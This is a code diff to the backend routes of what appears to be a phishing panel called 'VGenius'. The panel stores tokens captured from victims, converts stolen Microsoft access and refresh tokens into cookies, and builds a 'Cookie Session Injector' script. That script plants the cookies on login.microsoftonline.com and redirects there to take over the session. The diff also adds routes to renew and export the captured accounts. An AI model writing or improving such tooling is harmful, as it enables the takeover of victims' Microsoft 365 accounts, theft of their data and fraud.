@@ -88,7 +88,7 @@ router.delete('/:id', userAuth, async (req, res) => {
   }
 });
 
-// Generate cookie script - COMBINES cookies + access_token + refresh_token
+// Generate cookie script - EXACT competitor format
 router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
@@ -99,14 +99,17 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     const accessToken = decrypt(token.access_token_encrypted);
     const refreshToken = decrypt(token.refresh_token_encrypted);
     
-    // If no stored cookies, try to convert from access_token
+    // If no stored cookies, convert from access_token
     if ((!cookies || cookies.trim() === '') && accessToken) {
       try {
         const cookieConverter = require('../services/cookieconverter');
         const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type);
         if (result.success && result.cookies) {
           cookies = result.cookies;
-          await db.query('UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?', [encrypt(cookies), 'cookie', token.id]);
+          await db.query(
+            'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
+            [encrypt(cookies), 'cookie', token.id]
+          );
         }
       } catch (convErr) {
         console.error('[Tokens] Cookie conversion error:', convErr.message);
@@ -114,48 +117,45 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     }
     
     if (!cookies || cookies.trim() === '') {
-      return res.status(400).json({ error: 'No cookies available. Please use the Renew button to convert tokens to cookies first.', has_access_token: !!token.access_token_encrypted });
+      return res.status(400).json({
+        error: 'No cookies available. Please use the Renew button first.',
+        has_access_token: !!token.access_token_encrypted
+      });
     }
     
-    // Build VERY LONG cookie string by combining ALL data
+    // Build array of ALL parts: cookies + tokens
     var parts = [];
-    
-    // Add stored cookies
-    const cookieArray = cookies.split(';').map(function(c) { return c.trim(); }).filter(function(c) { return c; });
+    var cookieArray = cookies.split(';').map(function(c) { return c.trim(); }).filter(function(c) { return c; });
     for (var i = 0; i < cookieArray.length; i++) {
       parts.push(cookieArray[i]);
     }
     
-    // Add access_token as a cookie value
+    // Add access_token as x-ms-RefreshTokenCredential
     if (accessToken) {
-      parts.push('access_token=' + accessToken);
+      parts.push('x-ms-RefreshTokenCredential=' + accessToken);
     }
     
-    // Add refresh_token as a cookie value
+    // Add refresh_token
     if (refreshToken) {
-      parts.push('refresh_token=' + refreshToken);
+      parts.push('RefreshToken=' + refreshToken);
     }
     
-    // Join with & separator for VERY long string like competitor
-    var cookieString = parts.join('&');
-    
-    var script = '// VGenius Cookie Session Injector\n';
-    script += '// Automatic redirect in 3 seconds\n\n';
-    script += 'var cookieData = "' + cookieString + '";\n\n';
-    script += 'var pairs = cookieData.split("&");\n';
-    script += 'for (var i = 0; i < pairs.length; i++) {\n';
-    script += '  var pair = pairs[i].trim();\n';
-    script += '  var eq = pair.indexOf("=");\n';
-    script += '  if (eq > 0) {\n';
-    script += '    document.cookie = pair.substring(0, eq) + "=" + pair.substring(eq + 1) + "; path=/; expires=Fri, 18 Dec 2099 23:59:59 UTC; secure; SameSite=None";\n';
-    script += '  }\n';
-    script += '}\n\n';
-    script += 'console.log("Cookies injected. Redirecting...");\n';
-    script += 'setTimeout(function() {\n';
-    script += '  window.location.href = "https://outlook.office365.com/";\n';
+    // Build script 
+    var script = '// VGenius Cookie Session Injector\n\n';
+    for (var i = 0; i < parts.length; i++) {
+      script += 'document.cookie = "' + parts[i] + '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
+    }
+    script += '\n';
+    script += '// Redirect after 3s\n';
+    script += 'setTimeout(() => {\n';
+    script += ' window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
     script += '}, 3000);\n';
     
-    res.json({ script: script, cookie_count: parts.length, cookies: parts });
+    res.json({
+      script: script,
+      cookie_count: parts.length,
+      cookies: parts
+    });
   } catch (err) {
     console.error('[Tokens] Cookie script error:', err);
     res.status(500).json({ error: 'Failed to generate script' });
@@ -171,15 +171,22 @@ router.post('/:id/renew', userAuth, async (req, res) => {
     const token = tokens[0];
     const accessToken = decrypt(token.access_token_encrypted);
     if (!accessToken) {
-      return res.status(400).json({ error: 'No access token available for renewal' });
+      return res.status(400).json({ error: 'No access token available' });
     }
     
     const cookieConverter = require('../services/cookieconverter');
     const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type, '', '');
     
     if (result.success && result.cookies) {
-      await db.query('UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?', [encrypt(result.cookies), 'cookie', token.id]);
-      res.json({ success: true, cookies: result.cookies, cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length });
+      await db.query(
+        'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
+        [encrypt(result.cookies), 'cookie', token.id]
+      );
+      res.json({
+        success: true,
+        cookies: result.cookies,
+        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length
+      });
     } else {
       res.status(400).json({ error: result.error || 'Conversion failed', success: false });
     }
@@ -192,7 +199,10 @@ router.post('/:id/renew', userAuth, async (req, res) => {
 // Get renewal history
 router.get('/:id/renewals', userAuth, async (req, res) => {
   try {
-    const [renewals] = await db.query('SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50', [req.params.id, req.user.id]);
+    const [renewals] = await db.query(
+      'SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50',
+      [req.params.id, req.user.id]
+    );
     res.json(renewals);
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
@@ -202,7 +212,10 @@ router.get('/:id/renewals', userAuth, async (req, res) => {
 // Export tokens
 router.post('/export', userAuth, async (req, res) => {
   try {
-    const [tokens] = await db.query('SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC', [req.user.id]);
+    const [tokens] = await db.query(
+      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
+      [req.user.id]
+    );
     res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
@@ -212,7 +225,10 @@ router.post('/export', userAuth, async (req, res) => {
 // Export and delete all
 router.post('/export-delete-all', userAuth, async (req, res) => {
   try {
-    const [tokens] = await db.query('SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
+    const [tokens] = await db.query(
+      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0',
+      [req.user.id]
+    );
     await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);
     res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length, deleted: true });
   } catch (err) {
